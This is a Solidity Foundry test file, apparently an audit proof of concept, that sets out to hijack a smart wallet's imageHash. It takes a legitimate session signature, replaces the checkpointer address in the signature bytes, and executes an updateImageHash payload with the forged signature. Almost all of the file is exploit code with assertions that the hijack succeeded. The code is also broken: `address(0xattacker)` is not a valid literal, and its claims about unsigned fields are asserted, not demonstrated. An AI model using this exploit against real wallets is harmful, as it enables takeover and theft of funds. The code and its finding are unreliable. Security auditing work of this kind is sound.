// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/auth/BaseAuth.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    // ATTACK TIMELINE:
    // 1. [Setup] Deploy contracts, fund accounts, create Wallet with session topology
    // 2. [T=0] Attacker creates a payload to update the Wallet's imageHash to their own signer set
    // 3. [T=1] User signs the payload legitimately using the sessionManager as checkpointer
    // 4. [T=2] Attacker captures the signature and replaces the checkpointer address in the signature bytes
    // 5. [T=3] Attacker submits the modified signature to execute the payload
    // 6. [Assert] Verify the Wallet's imageHash was successfully hijacked despite the checkpointer forgery

    function test_exploit() public {
        // 1. Setup: Create topology and Wallet
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 originalImageHash) = _createWallet(topology);

        // 2. Attacker defines their malicious imageHash
        bytes32 attackerImageHash = keccak256("attacker_controlled_signer_set");

        // 3. Build payload to hijack the Wallet configuration
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls[0].to = address(Wallet);
        payload.calls[0].value = 0;
        payload.calls[0].data = abi.encodeWithSelector(BaseAuth.updateImageHash.selector, attackerImageHash);

        // 4. Generate legitimate signature from the user (using sessionManager as checkpointer)
        uint8[] memory permissionIdxs = new uint8[](1);
        permissionIdxs[0] = 0;
        bytes memory legitimateSignature = _validExplicitSignature(
            payload, 
            sessionWallet, 
            config, 
            topology, 
            permissionIdxs
        );

        // 5. Attacker forges the signature by replacing the checkpointer address in the bytes
        // The checkpointer address is not covered by the signed hash, so this modification goes undetected
        address forgedCheckpointer = address(0xdead);
        bytes memory forgedSignature = _replaceAddressInBytes(
            legitimateSignature, 
            address(sessionManager), 
            forgedCheckpointer
        );

        // 6. Pack the payload for execution
        bytes memory packedPayload = _packPayload(payload);

        // 7. Execute the hijack using the forged signature
        // Because chainId=0 in the domain separator and checkpointer is unsigned, verification passes
        vm.prank(address(0xattacker));
        Wallet.execute(packedPayload, forgedSignature);

        // 8. Assert: The Wallet's imageHash has been successfully hijacked
        bytes32 currentImageHash = Wallet.imageHash();
        assertEq(
            currentImageHash, 
            attackerImageHash, 
            "Exploit failed: Wallet imageHash was not hijacked by the forged checkpointer signature"
        );
        assertTrue(
            currentImageHash != originalImageHash,
            "Exploit failed: ImageHash remained unchanged"
        );
    }

    function _replaceAddressInBytes(
        bytes memory data, 
        address oldAddr, 
        address newAddr
    ) internal pure returns (bytes memory) {
        bytes memory result = data;
        bytes20 oldBytes = bytes20(oldAddr);
        bytes20 newBytes = bytes20(newAddr);

        for (uint i = 0; i <= result.length - 20; i++) {
            bool matchFound = true;
            for (uint j = 0; j < 20; j++) {
                if (result[i + j] != oldBytes[j]) {
                    matchFound = false;
                    break;
                }
            }
            if (matchFound) {
                for (uint j = 0; j < 20; j++) {
                    result[i + j] = newBytes[j];
                }
                return result;
            }
        }
        revert("Address not found in signature bytes");
    }

    function _packPayload(Payload.Decoded memory payload) internal pure returns (bytes memory) {
        return abi.encode(
            payload.space,
            payload.nonce,
            payload.calls,
            payload.selfCalls
        );
    }
}
